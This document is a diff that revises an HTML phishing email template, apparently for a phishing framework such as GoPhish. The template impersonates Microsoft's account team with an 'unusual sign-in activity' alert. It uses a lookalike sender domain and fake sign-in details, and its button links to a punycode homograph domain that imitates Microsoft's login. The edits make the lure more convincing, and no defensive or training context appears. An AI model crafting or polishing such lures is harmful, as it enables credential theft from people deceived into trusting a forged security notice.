@@ -1,22 +1,36 @@
-From: "Microsoft Account Security" <no-reply@microsoft.com.security-login.io>
-To: user@example.com
-Subject: Security Alert: Your Microsoft account was used to sign in to a new app
+From: "Microsoft account team" <no-reply@microsoft.com.security-login.io>
+To: "{{.FirstName}}" <user@example.com>
+Subject: Microsoft account unusual sign-in activity
 Date: Mon, 02 Mar 2026 11:15:00 +0000
+Message-ID: <SECURITY-ALERT-992184@microsoft.com.security-login.io>
 MIME-Version: 1.0
 Content-Type: text/html; charset="UTF-8"
 
-<div style="background: #f2f2f2; padding: 40px; font-family: 'Segoe UI', Tahoma, sans-serif;">
+<div style="background: #f2f2f2; padding: 40px; font-family: 'Segoe UI', Arial, sans-serif;">
   <div style="max-width: 500px; margin: auto; background: white; padding: 40px; border: 1px solid #ddd;">
-    <img src="{{.URL}}" alt="Microsoft" style="width: 32px; margin-bottom: 20px;">
-    <h2 style="color: #333; font-size: 20px;">Security Info Update</h2>
-    <p style="color: #666;">Someone recently used your password to sign in to a new application: <b>"Legacy-Outlook-Web-Access"</b>.</p>
-    <div style="background: #fff8e1; padding: 15px; border-radius: 4px; margin: 20px 0;">
-      <p style="margin: 0; font-size: 14px;"><strong>Location:</strong> Lagos, Nigeria</p>
-      <p style="margin: 5px 0 0 0; font-size: 14px;"><strong>Browser:</strong> Chrome on Linux</p>
+    <h2 style="color: #333; font-size: 20px; font-weight: normal;">Microsoft account</h2>
+    <h3 style="color: #333; font-size: 24px; margin-top: 5px;">Unusual sign-in activity</h3>
+    <p style="color: #444; font-size: 15px;">We detected something unusual about a recent sign-in to the Microsoft account <b>{{.FirstName}}@company.com</b>.</p>
+    
+    <div style="background: #f9f9f9; padding: 20px; border: 1px solid #eee; margin: 25px 0;">
+      <p style="margin: 0; font-size: 14px;"><strong>Sign-in details</strong></p>
+      <p style="margin: 10px 0 5px 0; font-size: 14px;">Country/region: <b>Lagos, Nigeria</b></p>
+      <p style="margin: 5px 0 5px 0; font-size: 14px;">IP address: <b>102.89.34.112</b></p>
+      <p style="margin: 5px 0 0 0; font-size: 14px;">Platform: <b>Chrome on Linux</b></p>
     </div>
-    <p>If this was not you, please use the secure link below to protect your account and revert this change.</p>
-    <div style="text-align: center; margin-top: 30px;">
-      <a href="{{.URL}}" style="background: #0078d4; color: white; padding: 12px 30px; text-decoration: none; border-radius: 2px; font-weight: bold;">Secure Account</a>
+    
+    <p style="font-size: 15px;">Please go to your recent activity page to let us know whether or not this was you. If this wasn't you, we'll help you secure your account.</p>
+    
+    <div style="text-align: left; margin-top: 30px;">
+      <a href="https://xn--mcrosoft-9eb.com-security-check.io/auth" style="background: #0078d4; color: white; padding: 12px 30px; text-decoration: none; border-radius: 0; font-weight: bold; display: inline-block;">Review recent activity</a>
     </div>
+    
+    <p style="font-size: 14px; color: #666; margin-top: 25px;">To opt out or change where you receive security notifications, click here.</p>
+    <p style="font-size: 14px; color: #666;">Thanks,<br>The Microsoft account team</p>
+  </div>
+  
+  <div style="max-width: 500px; margin: 20px auto; color: #888; font-size: 11px;">
+    <p>This message was sent from an unmonitored e-mail address. Consult the Microsoft Service Agrement for more information about privacy and security.</p>
+    <p>&copy; 2026 Microsof Corporation. All rights reserved.</p>
   </div>
 </div>
